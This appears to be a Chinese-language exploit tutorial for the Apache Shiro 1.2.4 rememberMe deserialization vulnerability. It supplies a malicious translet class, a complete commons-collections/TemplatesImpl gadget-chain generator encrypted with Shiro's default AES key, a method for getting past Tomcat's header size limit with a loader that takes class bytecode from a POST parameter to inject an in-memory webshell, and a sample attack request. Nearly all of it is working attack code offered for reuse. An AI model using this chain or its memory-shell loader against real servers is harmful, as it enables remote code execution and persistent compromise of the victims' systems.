## **流程**
1. 写一段恶意Java代码
2. 利用commons-collections环境TemplatesImpl链加载class字节码
3. 导出payload

新建一个maven项目，pom.xml配置如下，注意，本项目基于Java8

```
<dependencies>
    <dependency>
        <groupId>org.apache.shiro</groupId>
        <artifactId>shiro-core</artifactId>
        <version>1.2.4</version>
    </dependency>
    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.30.2-GA</version>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>9.0.97</version>
    </dependency>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>4.0.1</version>
    </dependency>
</dependencies>
```

这里的恶意代码就是在/tmp目录下创建一个文件，文件名touch.java

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
​
import java.io.IOException;
​
public class touch extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/success");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

接下来创建出一个java对象并导出序列化文件，TemplatesImpl链可以帮我们完成这一步。`TemplatesImpl`​ 是Java XSLT处理的核心类，其内部 `_bytecodes`​ 字段允许直接加载字节码。通过构造特殊的反序列化链触发其 `getTransletInstance()`​ 方法，可动态加载并执行恶意类（需继承 `AbstractTranslet`​）。在Shiro漏洞利用中，我们通过 `InstantiateTransformer`​ 实例化 `TrAXFilter`​ 来触发该方法，最终实现任意代码执行。

```
​
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
​
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
​
public class ShiroPayload extends AbstractTranslet {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        byte[] code = ClassPool.getDefault().getCtClass("touch").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        Transformer transformersChain = new ChainedTransformer(faketransformers);
​
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformersChain);
​
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
​
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
​
        setFieldValue(transformersChain, "iTransformers", transformers);
​
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(expMap);
        oos.close();
​
​
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
​
        ByteSource ciphertext = aes.encrypt(bos.toByteArray(), key);
        System.out.printf(ciphertext.toString());
​
    }
​
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
​
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

在Shiro的RememberMe生成时，AES秘钥使用默认的kPH+bIxk5D2deZiIxcaaaA\\=\\=，请自行根据实际情况替换，第36行main()方法中的

```
byte[] code = ClassPool.getDefault().getCtClass("touch").toBytecode();
```

用于获取某个类的字节码，在后面会多次使用此类，本文不再重复贴出代码，请自行替换"touch"为需要加载的类。



^
## **中转方式注入内存马**
Shrio的rememberMe的base64字符串太大，请求失败。
tomcat中间件对请求头header长度作出了限制，默认大小为8k。



那么我们现在就要尝试开始着手解决header大小的问题了，一个思路是Shiro的Payload不含内存马注入类，而是做一个ShellLoader，这个ShellLoader负责从post data部分获取类的字节码并加载执行。

问题变成了在全局无request对象的情况下，如何获取一个request，只有拿到了request对象，才能获取到请求包中的相关信息。

这里可以借助TomcatEcho通用回显，其获取顺序如下

```
Thread.currentThread().getContextClassLoader():WebappClassLoaderBase
  ->resources:org.apache.catalina.webresources.StandardRoot
  ->context:org.apache.catalina.core.StandardContext
  ->context:org.apache.catalina.core.ApplicationContext
  ->service:org.apache.catalina.core.StandardService
  ->connectors:org.apache.catalina.connector.Connector[0]
  ->protocolHandler:org.apache.coyote.AbstractProtocol
  ->handler:org.apache.coyote.AbstractProtocol$ConnectionHandler
  ->global:org.apache.coyote.RequestGroupInfo
  ->processors[]:ArrayList<RequestInfo>
  ->req:org.apache.coyote.Request
  ->getNode(1):org.apache.catalina.connector.Request
```

通过这个链条，我们最终就拿到一个org.apache.catalina.connector.Request对象，此对象继承javax.servlet.http.HttpServletRequest，同时我们还可以通过request.getResponse()构造响应数据。


^
实现从POST中code参数加载注入
```
POST / HTTP/1.1
Host: 192.168.1.100:8080
Content-Type: application/x-www-form-urlencoded
Cookie: rememberMe=ShellLoader部分Payload

code=上面输出的内容，记得发的时候要url编码一下
```